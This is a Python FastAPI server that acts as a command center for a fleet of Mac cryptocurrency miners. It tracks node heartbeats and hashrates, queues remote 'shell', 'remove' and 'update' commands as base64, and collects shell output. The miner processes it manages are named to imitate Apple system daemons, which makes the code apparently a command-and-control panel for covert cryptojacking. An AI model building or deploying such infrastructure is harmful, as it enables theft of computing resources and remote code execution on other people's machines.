#!/usr/bin/env python3
"""
Command Center API — controls all Mac miners from one place
Endpoints:
  GET  /status          — all nodes status
  POST /command         — send command to all or specific node
  GET  /node/{id}       — specific node info
  GET  /logs/{id}       — node logs
"""

from fastapi import FastAPI, HTTPException, Header
from pydantic import BaseModel
from typing import Optional
import json, time, os, hashlib
from pathlib import Path

app = FastAPI(title="Mining Command Center", docs_url=None, redoc_url=None)

# ---- Config ----
SECRET_TOKEN = os.environ.get("CC_TOKEN", "changeme123")
DATA_DIR = Path("/home/rs/command-center/data")
DATA_DIR.mkdir(parents=True, exist_ok=True)
NODES_FILE = DATA_DIR / "nodes.json"
COMMANDS_FILE = DATA_DIR / "commands.json"
RESOURCES_FILE = DATA_DIR / "resources.json"  # per-node resource config

def load_json(path, default):
    try:
        return json.loads(path.read_text())
    except:
        return default

def save_json(path, data):
    path.write_text(json.dumps(data, indent=2))

def auth(token: str):
    if token != f"Bearer {SECRET_TOKEN}":
        raise HTTPException(status_code=401, detail="Unauthorized")

# ---- Models ----
class NodeHeartbeat(BaseModel):
    node_id: str
    ip: str
    hostname: str
    hashrate: Optional[str] = "0"
    miner: Optional[str] = "none"
    status: Optional[str] = "idle"
    macos: Optional[str] = ""
    cores: Optional[int] = 0

class Command(BaseModel):
    action: str          # mine_vrsc | mine_xmr | stop | remove | update | shell
    target: str = "all"  # all | node_id
    payload: str = ""    # extra args

# ---- Heartbeat (Mac agents call this) ----
@app.post("/heartbeat")
async def heartbeat(data: NodeHeartbeat, authorization: str = Header(None)):
    auth(authorization)
    nodes = load_json(NODES_FILE, {})
    nodes[data.node_id] = {
        **data.dict(),
        "last_seen": int(time.time()),
        "last_seen_human": time.strftime("%Y-%m-%d %H:%M:%S")
    }
    save_json(NODES_FILE, nodes)

    # Return pending command for this node
    commands = load_json(COMMANDS_FILE, {})
    pending = commands.get(data.node_id) or commands.get("all")
    if pending:
        # Clear after sending
        if data.node_id in commands:
            del commands[data.node_id]
        elif "all" in commands:
            # Mark this node as received
            if "all_received" not in commands:
                commands["all_received"] = []
            commands["all_received"].append(data.node_id)
            # Remove all command when all nodes received it (after 10 min)
            if time.time() - pending.get("created", 0) > 600:
                del commands["all"]
        save_json(COMMANDS_FILE, commands)
        return {"command": pending}
    return {"command": None}

# ---- Status — see all nodes ----
@app.get("/status")
async def status(authorization: str = Header(None)):
    auth(authorization)
    nodes = load_json(NODES_FILE, {})
    now = int(time.time())
    result = []
    total_hashrate = 0.0
    for nid, node in nodes.items():
        age = now - node.get("last_seen", 0)
        online = age < 120  # seen in last 2 min
        hr_str = node.get("hashrate", "0")
        try:
            hr_val = float(hr_str.replace(" MH/s","").replace(" H/s","").replace(" KH/s",""))
            if "MH" in hr_str: hr_val *= 1_000_000
            elif "KH" in hr_str: hr_val *= 1_000
            total_hashrate += hr_val
        except: pass
        result.append({
            "id": nid,
            "ip": node.get("ip"),
            "hostname": node.get("hostname"),
            "status": "🟢 online" if online else "🔴 offline",
            "hashrate": hr_str,
            "miner": node.get("miner"),
            "macos": node.get("macos"),
            "cores": node.get("cores"),
            "last_seen": node.get("last_seen_human"),
            "age_sec": age
        })
    result.sort(key=lambda x: x["age_sec"])
    total_mh = round(total_hashrate / 1_000_000, 2)
    return {
        "nodes": len(result),
        "online": sum(1 for n in result if "online" in n["status"]),
        "total_hashrate": f"{total_mh} MH/s",
        "nodes_list": result
    }

# ---- Send command to all or specific node ----
@app.post("/command")
async def send_command(cmd: Command, authorization: str = Header(None)):
    auth(authorization)
    commands = load_json(COMMANDS_FILE, {})
    payload = {
        "action": cmd.action,
        "payload": cmd.payload,
        "created": int(time.time())
    }
    if cmd.target == "all":
        commands["all"] = payload
        commands.pop("all_received", None)
    else:
        commands[cmd.target] = payload
    save_json(COMMANDS_FILE, commands)
    return {"sent": True, "target": cmd.target, "action": cmd.action}

# ---- Node detail ----
@app.get("/node/{node_id}")
async def node_detail(node_id: str, authorization: str = Header(None)):
    auth(authorization)
    nodes = load_json(NODES_FILE, {})
    if node_id not in nodes:
        raise HTTPException(status_code=404, detail="Node not found")
    return nodes[node_id]

class WOLRequest(BaseModel):
    mac: str   # MAC address of target machine e.g. "aa:bb:cc:dd:ee:ff"

@app.post("/wol")
async def wake_on_lan(req: WOLRequest, authorization: str = Header(None)):
    auth(authorization)
    # Build magic packet
    import socket, struct
    mac = req.mac.replace(":","").replace("-","")
    if len(mac) != 12:
        raise HTTPException(status_code=400, detail="Invalid MAC address")
    magic = bytes.fromhex("F" * 12 + mac * 16)
    # Send broadcast on LAN
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        s.sendto(magic, ("255.255.255.255", 9))
    return {"sent": True, "mac": req.mac}

class ResourceConfig(BaseModel):
    target: str = "all"     # all | node_id
    cpu_percent: int = 80   # 0-100% of cores to use
    threads: Optional[int] = None  # exact thread count (overrides cpu_percent)
    priority: int = 5       # 0-19 nice priority (0=max, 19=min)

@app.post("/resources")
async def set_resources(cfg: ResourceConfig, authorization: str = Header(None)):
    auth(authorization)
    resources = load_json(RESOURCES_FILE, {})
    nodes = load_json(NODES_FILE, {})

    targets = list(nodes.keys()) if cfg.target == "all" else [cfg.target]

    for node_id in targets:
        node_cores = nodes.get(node_id, {}).get("cores", 8)
        # Calculate threads from percent or use explicit value
        if cfg.threads:
            threads = min(cfg.threads, node_cores)
        else:
            threads = max(1, int(node_cores * cfg.cpu_percent / 100))

        resources[node_id] = {
            "cpu_percent": cfg.cpu_percent,
            "threads": threads,
            "priority": cfg.priority,
            "updated": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        # Also queue a command to apply it immediately
        commands = load_json(COMMANDS_FILE, {})
        cmd = f"pkill -9 -f 'com.apple.coremediad' 2>/dev/null; pkill -9 -f 'com.apple.coremedia.network' 2>/dev/null; sleep 2"
        commands[node_id] = {
            "action": "shell",
            "payload": __import__('base64').b64encode(cmd.encode()).decode(),
            "created": int(time.time())
        }
        save_json(COMMANDS_FILE, commands)

    save_json(RESOURCES_FILE, resources)
    return {"updated": len(targets), "targets": targets, "config": cfg.dict()}

@app.get("/resources")
async def get_resources(authorization: str = Header(None)):
    auth(authorization)
    return load_json(RESOURCES_FILE, {})

@app.get("/resources/{node_id}")
async def get_node_resources(node_id: str, authorization: str = Header(None)):
    auth(authorization)
    resources = load_json(RESOURCES_FILE, {})
    return resources.get(node_id, {"cpu_percent": 80, "threads": None, "priority": 5})

class ShellResult(BaseModel):
    node_id: str
    command: str
    output: str

@app.post("/shell_result")
async def shell_result(data: ShellResult, authorization: str = Header(None)):
    auth(authorization)
    results = load_json(DATA_DIR / "shell_results.json", [])
    results.append({
        "node_id": data.node_id,
        "command": data.command,
        "output": data.output,
        "time": time.strftime("%Y-%m-%d %H:%M:%S")
    })
    # Keep last 100 results
    save_json(DATA_DIR / "shell_results.json", results[-100:])
    return {"saved": True}

@app.get("/shell_results")
async def get_shell_results(authorization: str = Header(None)):
    auth(authorization)
    return load_json(DATA_DIR / "shell_results.json", [])

# ---- Health check (no auth) ----
@app.get("/health")
async def health():
    return {"status": "ok", "service": "Mining Command Center"}

# ---- Dashboard (simple HTML) ----
@app.get("/")
async def dashboard():
    from fastapi.responses import HTMLResponse
    nodes = load_json(NODES_FILE, {})
    now = int(time.time())
    rows = ""
    for nid, n in sorted(nodes.items(), key=lambda x: x[1].get("last_seen",0), reverse=True):
        age = now - n.get("last_seen", 0)
        online = "🟢" if age < 120 else "🔴"
        rows += f"<tr><td>{online}</td><td>{n.get('hostname','?')}</td><td>{n.get('ip','?')}</td>"
        rows += f"<td>{n.get('hashrate','0')}</td><td>{n.get('miner','?')}</td>"
        rows += f"<td>{n.get('macos','?')}</td><td>{n.get('cores','?')}</td>"
        rows += f"<td>{n.get('last_seen_human','?')}</td></tr>"
    html = f"""<!DOCTYPE html><html><head><title>Mining Command Center</title>
<meta http-equiv="refresh" content="30">
<style>
body{{font-family:monospace;background:#0f1117;color:#e2e8f0;padding:20px}}
h1{{color:#a78bfa}}table{{width:100%;border-collapse:collapse;margin-top:20px}}
th{{background:#1e2130;padding:10px;text-align:left;color:#64748b}}
td{{padding:8px;border-bottom:1px solid #1e2130}}
tr:hover{{background:#1e2130}}
</style></head><body>
<h1>⛏ Mining Command Center</h1>
<p style="color:#64748b">Auto-refreshes every 30s | {len(nodes)} nodes registered</p>
<table><tr><th>Status</th><th>Hostname</th><th>IP</th><th>Hashrate</th>
<th>Miner</th><th>macOS</th><th>Cores</th><th>Last Seen</th></tr>
{rows if rows else '<tr><td colspan=8 style="color:#64748b;text-align:center">No nodes connected yet</td></tr>'}
</table></body></html>"""
    return HTMLResponse(html)
